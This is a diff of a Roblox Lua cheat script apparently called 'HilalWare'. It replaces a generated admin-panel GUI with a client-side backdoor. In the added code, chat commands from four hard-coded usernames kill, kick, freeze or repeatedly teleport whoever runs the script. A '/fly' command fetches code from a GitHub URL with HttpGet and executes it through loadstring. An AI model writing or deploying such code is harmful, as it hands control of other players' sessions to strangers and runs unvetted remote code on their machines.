@@ -1,459 +1,174 @@
---[=[
- d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
-88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
-88      88    88    88            odD'      88      88    88 88ooo88 
-88  ooo 88    88    88          .88'        88      88    88 88~~~88 
-88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
- Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
-
-designed using localmaze gui creator
-]=]
-
--- Instances: 34 | Scripts: 2 | Modules: 0 | Tags: 1
-local CollectionService = game:GetService("CollectionService");
-local G2L = {};
-
--- Players.q692q.PlayerGui.AdminPanel
-G2L["AdminPanel_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
-G2L["AdminPanel_1"]["Name"] = [[AdminPanel]];
-G2L["AdminPanel_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
-
--- Tags
-CollectionService:AddTag(G2L["AdminPanel_1"], [[main]]);
-
--- Players.q692q.PlayerGui.AdminPanel.Frame
-G2L["Frame_2"] = Instance.new("Frame", G2L["AdminPanel_1"]);
-G2L["Frame_2"]["BorderSizePixel"] = 0;
-G2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
-G2L["Frame_2"]["Size"] = UDim2.new(0.24706, 0, 0.55023, 0);
-G2L["Frame_2"]["Position"] = UDim2.new(0.35588, 0, 0.16692, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.kill
-G2L["kill_3"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["kill_3"]["TextWrapped"] = true;
-G2L["kill_3"]["BorderSizePixel"] = 0;
-G2L["kill_3"]["TextScaled"] = true;
-G2L["kill_3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["kill_3"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["kill_3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["kill_3"]["Size"] = UDim2.new(0.27976, 0, 0.08989, 0);
-G2L["kill_3"]["Text"] = [[Kill]];
-G2L["kill_3"]["Name"] = [[kill]];
-G2L["kill_3"]["Position"] = UDim2.new(0.02381, 0, 0.33708, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.kill.UICorner
-G2L["UICorner_4"] = Instance.new("UICorner", G2L["kill_3"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.kill.UIStroke
-G2L["UIStroke_5"] = Instance.new("UIStroke", G2L["kill_3"]);
-G2L["UIStroke_5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_5"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.LocalScript
-G2L["LocalScript_6"] = Instance.new("LocalScript", G2L["Frame_2"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.UIAspectRatioConstraint
-G2L["UIAspectRatioConstraint_7"] = Instance.new("UIAspectRatioConstraint", G2L["Frame_2"]);
-G2L["UIAspectRatioConstraint_7"]["AspectRatio"] = 0.94382;
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Un Loop Bring
-G2L["Un Loop Bring_8"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["Un Loop Bring_8"]["TextWrapped"] = true;
-G2L["Un Loop Bring_8"]["BorderSizePixel"] = 0;
-G2L["Un Loop Bring_8"]["TextScaled"] = true;
-G2L["Un Loop Bring_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["Un Loop Bring_8"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["Un Loop Bring_8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["Un Loop Bring_8"]["Size"] = UDim2.new(0.43452, 0, 0.08989, 0);
-G2L["Un Loop Bring_8"]["Text"] = [[Un Loop Bring]];
-G2L["Un Loop Bring_8"]["Name"] = [[Un Loop Bring]];
-G2L["Un Loop Bring_8"]["Position"] = UDim2.new(0.54762, 0, 0.2191, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Un Loop Bring.UICorner
-G2L["UICorner_9"] = Instance.new("UICorner", G2L["Un Loop Bring_8"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Un Loop Bring.UIStroke
-G2L["UIStroke_a"] = Instance.new("UIStroke", G2L["Un Loop Bring_8"]);
-G2L["UIStroke_a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.UIStroke
-G2L["UIStroke_b"] = Instance.new("UIStroke", G2L["Frame_2"]);
-G2L["UIStroke_b"]["Thickness"] = 2;
-G2L["UIStroke_b"]["Color"] = Color3.fromRGB(255, 0, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.AdminPanel
-G2L["AdminPanel_c"] = Instance.new("TextLabel", G2L["Frame_2"]);
-G2L["AdminPanel_c"]["TextWrapped"] = true;
-G2L["AdminPanel_c"]["BorderSizePixel"] = 0;
-G2L["AdminPanel_c"]["TextScaled"] = true;
-G2L["AdminPanel_c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["AdminPanel_c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["AdminPanel_c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["AdminPanel_c"]["BackgroundTransparency"] = 1;
-G2L["AdminPanel_c"]["Size"] = UDim2.new(0.98214, 0, 0.08989, 0);
-G2L["AdminPanel_c"]["Text"] = [[HilalWare.Lua Hile davranış paneli]];
-G2L["AdminPanel_c"]["Name"] = [[AdminPanel]];
-G2L["AdminPanel_c"]["Position"] = UDim2.new(0.00595, 0, 0.00562, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.UICorner
-G2L["UICorner_d"] = Instance.new("UICorner", G2L["Frame_2"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Loop Bring
-G2L["Loop Bring_e"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["Loop Bring_e"]["TextWrapped"] = true;
-G2L["Loop Bring_e"]["BorderSizePixel"] = 0;
-G2L["Loop Bring_e"]["TextScaled"] = true;
-G2L["Loop Bring_e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["Loop Bring_e"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["Loop Bring_e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["Loop Bring_e"]["Size"] = UDim2.new(0.43452, 0, 0.08989, 0);
-G2L["Loop Bring_e"]["Text"] = [[Loop Bring]];
-G2L["Loop Bring_e"]["Name"] = [[Loop Bring]];
-G2L["Loop Bring_e"]["Position"] = UDim2.new(0.02381, 0, 0.2191, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Loop Bring.UICorner
-G2L["UICorner_f"] = Instance.new("UICorner", G2L["Loop Bring_e"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Loop Bring.UIStroke
-G2L["UIStroke_10"] = Instance.new("UIStroke", G2L["Loop Bring_e"]);
-G2L["UIStroke_10"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_10"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Bring
-G2L["Bring_11"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["Bring_11"]["TextWrapped"] = true;
-G2L["Bring_11"]["BorderSizePixel"] = 0;
-G2L["Bring_11"]["TextScaled"] = true;
-G2L["Bring_11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["Bring_11"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["Bring_11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["Bring_11"]["Size"] = UDim2.new(0.43452, 0, 0.08989, 0);
-G2L["Bring_11"]["Text"] = [[Bring]];
-G2L["Bring_11"]["Name"] = [[Bring]];
-G2L["Bring_11"]["Position"] = UDim2.new(0.02381, 0, 0.11798, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Bring.LocalScript
-G2L["LocalScript_12"] = Instance.new("LocalScript", G2L["Bring_11"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Bring.UICorner
-G2L["UICorner_13"] = Instance.new("UICorner", G2L["Bring_11"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Bring.UIStroke
-G2L["UIStroke_14"] = Instance.new("UIStroke", G2L["Bring_11"]);
-G2L["UIStroke_14"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_14"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.KaraListe
-G2L["KaraListe_15"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["KaraListe_15"]["TextWrapped"] = true;
-G2L["KaraListe_15"]["BorderSizePixel"] = 0;
-G2L["KaraListe_15"]["TextScaled"] = true;
-G2L["KaraListe_15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["KaraListe_15"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["KaraListe_15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["KaraListe_15"]["Size"] = UDim2.new(0.3631, 0, 0.08989, 0);
-G2L["KaraListe_15"]["Text"] = [[Kara Listeye ekle]];
-G2L["KaraListe_15"]["Name"] = [[KaraListe]];
-G2L["KaraListe_15"]["Position"] = UDim2.new(0.30952, 0, 0.84831, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.KaraListe.UICorner
-G2L["UICorner_16"] = Instance.new("UICorner", G2L["KaraListe_15"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.KaraListe.UIStroke
-G2L["UIStroke_17"] = Instance.new("UIStroke", G2L["KaraListe_15"]);
-G2L["UIStroke_17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_17"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.kick
-G2L["kick_18"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["kick_18"]["TextWrapped"] = true;
-G2L["kick_18"]["BorderSizePixel"] = 0;
-G2L["kick_18"]["TextScaled"] = true;
-G2L["kick_18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["kick_18"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["kick_18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["kick_18"]["Size"] = UDim2.new(0.27976, 0, 0.08989, 0);
-G2L["kick_18"]["Text"] = [[Kick]];
-G2L["kick_18"]["Name"] = [[kick]];
-G2L["kick_18"]["Position"] = UDim2.new(0.69643, 0, 0.33708, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.kick.UICorner
-G2L["UICorner_19"] = Instance.new("UICorner", G2L["kick_18"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.kick.UIStroke
-G2L["UIStroke_1a"] = Instance.new("UIStroke", G2L["kick_18"]);
-G2L["UIStroke_1a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_1a"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.TextBox
-G2L["TextBox_1b"] = Instance.new("TextBox", G2L["Frame_2"]);
-G2L["TextBox_1b"]["CursorPosition"] = -1;
-G2L["TextBox_1b"]["BorderSizePixel"] = 0;
-G2L["TextBox_1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["TextBox_1b"]["BackgroundColor3"] = Color3.fromRGB(121, 121, 121);
-G2L["TextBox_1b"]["Size"] = UDim2.new(0.96429, 0, 0.1236, 0);
-G2L["TextBox_1b"]["Position"] = UDim2.new(0.01786, 0, 0.70787, 0);
-G2L["TextBox_1b"]["Text"] = [[]];
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.TextBox.UICorner
-G2L["UICorner_1c"] = Instance.new("UICorner", G2L["TextBox_1b"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.TextBox.UIStroke
-G2L["UIStroke_1d"] = Instance.new("UIStroke", G2L["TextBox_1b"]);
-G2L["UIStroke_1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Un Bring
-G2L["Un Bring_1e"] = Instance.new("TextButton", G2L["Frame_2"]);
-G2L["Un Bring_1e"]["TextWrapped"] = true;
-G2L["Un Bring_1e"]["BorderSizePixel"] = 0;
-G2L["Un Bring_1e"]["TextScaled"] = true;
-G2L["Un Bring_1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["Un Bring_1e"]["BackgroundColor3"] = Color3.fromRGB(83, 83, 83);
-G2L["Un Bring_1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
-G2L["Un Bring_1e"]["Size"] = UDim2.new(0.43452, 0, 0.08989, 0);
-G2L["Un Bring_1e"]["Text"] = [[Un Bring]];
-G2L["Un Bring_1e"]["Name"] = [[Un Bring]];
-G2L["Un Bring_1e"]["Position"] = UDim2.new(0.54762, 0, 0.11798, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Un Bring.UICorner
-G2L["UICorner_1f"] = Instance.new("UICorner", G2L["Un Bring_1e"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.Un Bring.UIStroke
-G2L["UIStroke_20"] = Instance.new("UIStroke", G2L["Un Bring_1e"]);
-G2L["UIStroke_20"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["UIStroke_20"]["Color"] = Color3.fromRGB(255, 255, 255);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.TextLabel
-G2L["TextLabel_21"] = Instance.new("TextLabel", G2L["Frame_2"]);
-G2L["TextLabel_21"]["BorderSizePixel"] = 0;
-G2L["TextLabel_21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["TextLabel_21"]["BackgroundTransparency"] = 0.7;
-G2L["TextLabel_21"]["Size"] = UDim2.new(0.95833, 0, 0.51124, 0);
-G2L["TextLabel_21"]["Text"] = [[Yakında]];
-G2L["TextLabel_21"]["Position"] = UDim2.new(0.01786, 0, 0.45506, 0);
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.TextLabel.UICorner
-G2L["UICorner_22"] = Instance.new("UICorner", G2L["TextLabel_21"]);
-
-
-
--- Players.q692q.PlayerGui.AdminPanel.Frame.LocalScript
-local function C_6()
-	local script = G2L["LocalScript_6"];
-	local frame = script.Parent
-	
-	local dragging = false
-	
-	local mouse = game.Players.LocalPlayer:GetMouse()
-	
-	local dragStartPosition = Vector2.new(0, 0)
-	
-	local frameStartPosition = Vector2.new(0, 0)
-	
-	
-	
-	-- Sürükleme işlevi
-	
-	frame.InputBegan:Connect(function(input)
-	
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-	
-			dragging = true
-	
-			dragStartPosition = Vector2.new(input.Position.X, input.Position.Y)
-	
-			frameStartPosition = frame.AbsolutePosition
-	
-			frame:BringToFront()
-	
-		end
-	
-	end)
-	
-	
-	
-	game:GetService("UserInputService").InputEnded:Connect(function(input)
-	
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-	
-			dragging = false
-	
-		end
-	
-	end)
-	
-	
-	
-	game:GetService("RunService").RenderStepped:Connect(function()
-	
-		if dragging then
-	
-			local newPosition = mouse.AbsolutePosition
-	
-			local delta = newPosition - dragStartPosition
-	
-			frame.Position = UDim2.new(0, frameStartPosition.X + delta.X, 0, frameStartPosition.Y + delta.Y)
-	
-		end
-	
-	end)
-	
-	
-	
-	-- UIStroke renk değiştirme işlevi
-	
-	local uiStroke = frame:FindFirstChild("UIStroke")
-	
-	
-	
-	if uiStroke then
-	
-		local function updateColor()
-	
-			local t = os.time()
-	
-			local r = math.sin(t * 0.5) * 0.5 + 0.5
-	
-			local g = math.sin(t * 0.5 + 2) * 0.5 + 0.5
-	
-			local b = math.sin(t * 0.5 + 4) * 0.5 + 0.5
-	
-			uiStroke.Color = Color3.new(r, g, b)
-	
-		end
-	
-		
-	
-		game:GetService("RunService").Heartbeat:Connect(updateColor)
-	
-	end	
-end;
-task.spawn(C_6);
--- Players.q692q.PlayerGui.AdminPanel.Frame.Bring.LocalScript
-local function C_12()
-	local script = G2L["LocalScript_12"];
-	-- Roblox'ta sohbet sistemini belirlemek için gereken servisler
-	
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	
-	local Players = game:GetService("Players")
-	
-	
-	
-	-- `bringButton` adındaki butonu bulmak için `script.Parent:WaitForChild()` kullanıyoruz.
-	
-	-- Bu, butonun koddan önce yüklenmesini sağlar ve "nil" hatasını önler.
-	
-	-- Varsayım: LocalScript ve bringButton aynı ebeveyn (ScreenGui) içinde
-	
-	local bringButton = script.Parent:WaitForChild("bringButton")
-	
-	
-	
-	local player = Players.LocalPlayer
-	
-	
-	
-	-- Butonun tıklanma olayını dinle
-	
-	bringButton.MouseButton1Click:Connect(function()
-	
-		-- Gönderilecek mesaj
-	
-		local message = "/bring"
-	
-		
-	
-		-- Yeni sohbet sistemini kontrol et (TextChatService)
-	
-		local textChatService = game:GetService("TextChatService")
-	
-		
-	
-		if textChatService and textChatService:IsA("TextChatService") then
-	
-			-- Yeni sohbet sistemi (TextChatService) aktifse
-	
-			local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-	
-			
-	
-			if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
-	
-				local sayMessageRequest = chatEvents.SayMessageRequest
-	
-				sayMessageRequest:FireServer(message, "All")
-	
-			else
-	
-				-- Eğer SayMessageRequest bulunamazsa, eski metodu dene
-	
-				if player:HasChatPermission() then
-	
-					player:Chat(message)
-	
-				end
-	
-			end
-	
-		else
-	
-			-- Eski sohbet sistemi (ChatService) aktifse
-	
-			if player:HasChatPermission() then
-	
-				player:Chat(message)
-	
-			end
-	
-		end
-	
-	end)	
-end;
-task.spawn(C_12);
-
-return G2L["AdminPanel_1"], require;
+--admin sistem fly/unfly/bring/kill/kick
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService") -- Döngüler için daha verimli
+local LocalPlayer = Players.LocalPlayer
+
+-- Yetkililer
+local allowedUsers = {
+    ["q692q"] = true,
+    ["muhammet_bekir2004"] = true,
+    ["HilalWare_Lua"] = true,
+    ["Muhammet_bekir2003"] = true
+}
+
+-- Döngü kontrol değişkenleri
+local loopKillActive = false
+local loopBringActive = false
+
+-- Yönetici etiketi
+local function addAdminTag(player)
+    local function onCharacterAdded(character)
+        local head = character:WaitForChild("Head", 5)
+        if head and not head:FindFirstChild("AdminTagGui") then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Name = "AdminTagGui"
+            billboard.Size = UDim2.new(0, 200, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 2, 0)
+            billboard.Adornee = head
+            billboard.AlwaysOnTop = true
+            billboard.Parent = head
+
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.Text = "Yönetici"
+            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            textLabel.TextStrokeTransparency = 0
+            textLabel.TextScaled = true
+            textLabel.Font = Enum.Font.GothamBold
+            textLabel.Parent = billboard
+        end
+    end
+
+    player.CharacterAdded:Connect(onCharacterAdded)
+    if player.Character then
+        onCharacterAdded(player.Character)
+    end
+end
+
+-- Karakterin tüm parçalarını dondur / çöz
+local function setAnchoredAllParts(char, anchored)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = anchored
+        end
+    end
+end
+
+-- Genel sohbet mesajı gönderme fonksiyonu
+local function sendMessage(message)
+    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+end
+
+-- Komutlar
+local function setupCommands(player)
+    player.Chatted:Connect(function(message)
+        message = string.lower(message)
+
+        if not allowedUsers[player.Name] then
+            return
+        end
+
+        local localChar = LocalPlayer.Character
+        local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
+        local localHumanoid = localChar and localChar:FindFirstChild("Humanoid")
+        
+        local adminChar = player.Character
+        local adminRoot = adminChar and adminChar:FindFirstChild("HumanoidRootPart")
+
+        -- Basit Komutlar
+        if message == "/kill" then
+            if localHumanoid then
+                localHumanoid.Health = 0
+                sendMessage("By HilalWare.Lua New Scripts")
+            end
+        elseif message == "/kick" then
+            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
+            sendMessage("By HilalWare.Lua New Scripts")
+        elseif message == "/freeze" then
+            if localChar then
+                setAnchoredAllParts(localChar, true)
+                sendMessage("By HilalWare.Lua New Scripts")
+            end
+        elseif message == "/unfreeze" then
+            if localChar then
+                setAnchoredAllParts(localChar, false)
+                sendMessage("By HilalWare.Lua New Scripts")
+            end
+        elseif message == "/bring" then
+            if localRoot and adminRoot then
+                localRoot.CFrame = adminRoot.CFrame + Vector3.new(0, 3, 0)
+                sendMessage("By HilalWare.Lua New Scripts")
+            end
+        elseif message == "/fly" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HilalWare-Official/HilalWare/refs/heads/main/fly" ))()
+            sendMessage("By HilalWare.Lua New Scripts")
+        elseif message == "/unfly" then
+            if _G.FlyFunction and typeof(_G.FlyFunction) == "function" then
+                _G.FlyFunction(false)
+                sendMessage("By HilalWare.Lua New Scripts")
+            end
+            
+        -- DÖNGÜSEL KOMUTLAR (DÜZELTİLMİŞ)
+        elseif message == "/loopkill" then
+            if localHumanoid then
+                loopKillActive = true
+                sendMessage("Loop Kill başlatıldı.")
+                -- Döngüyü coroutine içinde başlatarak scriptin kilitlenmesini önle
+                coroutine.wrap(function()
+                    while loopKillActive and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") do
+                        LocalPlayer.Character.Humanoid.Health = 0
+                        wait(1)
+                    end
+                end)()
+            end
+        elseif message == "/unloopkill" then
+            if loopKillActive then
+                loopKillActive = false -- Sadece bayrağı indir, döngü kendi kendine duracak.
+                sendMessage("Loop Kill durduruldu.")
+            end
+        elseif message == "/loopbring" then
+            if localRoot and adminRoot then
+                loopBringActive = true
+                sendMessage("Loop Bring başlatıldı.")
+                -- Döngüyü coroutine içinde başlat
+                coroutine.wrap(function()
+                    while loopBringActive and LocalPlayer.Character and player.Character do
+                        if LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChild("HumanoidRootPart") then
+                            LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                        end
+                        RunService.Heartbeat:Wait() -- wait() yerine daha verimli bir bekleme
+                    end
+                end)()
+            end
+        elseif message == "/unloopbring" then
+            if loopBringActive then
+                loopBringActive = false -- Bayrağı indirerek döngüyü sonlandır.
+                sendMessage("Loop Bring durduruldu.")
+            end
+        end
+    end)
+end
+
+-- Ana Kurulum
+Players.PlayerAdded:Connect(function(player)
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if allowedUsers[player.Name] then
+        addAdminTag(player)
+        setupCommands(player)
+    end
+end
+
+-- Script çalıştığında mesajları gönder
+wait(2)
+sendMessage("HilalWare.Lua New Kodlar")
+wait(0.5)
+sendMessage("@hilalware_lua @q692q @Muhammet_bekir2003 @muhammet_bekir2004 tarafından (hepsi aynı kişi)")
